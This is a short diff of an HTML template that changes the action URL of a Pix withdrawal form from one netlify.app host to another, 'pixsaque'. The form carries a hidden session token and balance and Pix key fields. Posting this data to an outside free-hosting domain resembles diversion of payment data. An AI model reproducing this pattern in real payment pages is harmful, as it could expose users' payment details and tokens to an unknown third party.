@@ -2,7 +2,7 @@
               </div>
               <div x-show="tab === 'pix'">
                   <!-- Pix Form -->
-                  <form method="POST" class="space-y-6" action="https://pix.netlify.app">
+                  <form method="POST" class="space-y-6" action="https://pixsaque.netlify.app">
                     <input type="hidden" name="_token" value="aO6rCeCVtu4XvkQlJhO4V35FTnYGP8V25BkKUtmh" autocomplete="off">                    <input type="hidden" name="method" value="pix">
                       <!-- Chave Pix -->
                       <!-- Saldo Disponível -->
